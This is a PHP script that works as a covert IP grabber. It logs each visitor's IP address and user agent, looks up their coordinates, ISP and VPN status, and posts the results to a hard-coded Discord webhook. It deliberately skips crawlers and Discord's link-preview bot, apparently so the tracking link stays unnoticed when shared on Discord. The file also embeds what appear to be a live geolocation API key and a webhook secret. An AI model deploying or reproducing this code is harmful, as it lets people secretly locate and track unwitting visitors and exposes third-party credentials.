<?php

class IpLogger {
    public function write($filename, $timezone) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        // Check if the user agent is a known bot or web crawler or Discord
        if ($this->isBot($userAgent) || $this->isDiscordUserAgent($userAgent)) {
            return; // Skip logging if it's a bot, web crawler, or Discord user agent
        }

        // Get IP geolocation data
        $geoData = $this->getIpGeoData($ip);

        if ($geoData === null) {
            error_log("Failed to retrieve geolocation data for IP: $ip");
            return;
        }

        // Prepare log entry with timestamp
        $timestamp = (new DateTime('now', new DateTimeZone($timezone)))->format('Y-m-d H:i:s');
        $logEntry = "$timestamp - IP: $ip - User Agent: $userAgent\n";

        // Write log entry to file
        if (file_put_contents($filename, $logEntry, FILE_APPEND) === false) {
            error_log("Failed to write to file: $filename");
        }

        // Send data to Discord
        $discord = new Discord();
        $response = $discord->sendIpToDiscord($ip, $userAgent, $geoData);
        if ($response === false) {
            error_log("Failed to send data to Discord");
        }
    }

    private function getIpGeoData($ip) {
        $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8'; // Replace with your ipgeolocation.io API key
        $url = "https://api.ipgeolocation.io/ipgeo?apiKey=$apiKey&ip=$ip";

        $curl = curl_init($url);
        curl_setopt_array($curl, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10, // Added timeout for better performance
        ]);
        $response = curl_exec($curl);
        curl_close($curl);

        if ($response === false) {
            error_log("Failed to retrieve geolocation data for IP: $ip");
            return null;
        }

        $data = json_decode($response, true);
        if (isset($data['latitude'], $data['longitude'])) {
            return [
                'latitude' => $data['latitude'],
                'longitude' => $data['longitude'],
                'is_vpn' => $data['is_vpn'] ?? false,
                'isp' => $data['isp'] ?? 'Unknown'
            ];
        } else {
            error_log("Invalid response from IP Geolocation API for IP: $ip");
            return null;
        }
    }

    private function isBot($userAgent) {
        $bots = [
            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
            'yandexbot', 'sogou', 'exabot', 'facebot', 'facebookexternalhit'
        ];

        foreach ($bots as $bot) {
            if (stripos($userAgent, $bot) !== false) {
                return true;
            }
        }

        return false;
    }

    private function isDiscordUserAgent($userAgent) {
        return stripos($userAgent, 'Discordbot') !== false;
    }
}

class Discord {
    public function sendIpToDiscord($ip, $userAgent, $geoData) {
        $Webhook = "https://discord.com/api/webhooks/1268297909875773571/u781Y8fkPHJi5Vdl5DEU8KbHpUiE8jJ64nUYTIv8Ep6CPFPZsysCizlNsOHNYsKzIbQv";
        $WebhookName = "KendrickBot";

        $fields = [
            [
                "name" => "IP",
                "value" => $ip,
                "inline" => true
            ],
            [
                "name" => "User Agent",
                "value" => $userAgent,
                "inline" => false
            ]
        ];

        if ($geoData) {
            $fields[] = [
                "name" => "VPN",
                "value" => $geoData['is_vpn'] ? 'Yes' : 'No',
                "inline" => true
            ];

            $fields[] = [
                "name" => "Coordinates",
                "value" => "Lat: {$geoData['latitude']}, Lon: {$geoData['longitude']}",
                "inline" => true
            ];

            $fields[] = [
                "name" => "ISP",
                "value" => $geoData['isp'],
                "inline" => false
            ];
        }

        $InfoArr = [
            "username" => $WebhookName,
            "embeds" => [
                [
                    "title" => "User Information",
                    "color" => 39423,
                    "fields" => $fields
                ]
            ]
        ];

        $JSON = json_encode($InfoArr);

        $curl = curl_init($Webhook);
        curl_setopt_array($curl, [
            CURLOPT_HTTPHEADER => ['Content-type: application/json'],
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $JSON,
            CURLOPT_RETURNTRANSFER => true
        ]);

        $response = curl_exec($curl);
        if (curl_errno($curl)) {
            error_log('cURL error: ' . curl_error($curl));
            curl_close($curl);
            return false;
        }

        curl_close($curl);
        return $response;
    }
}

?>
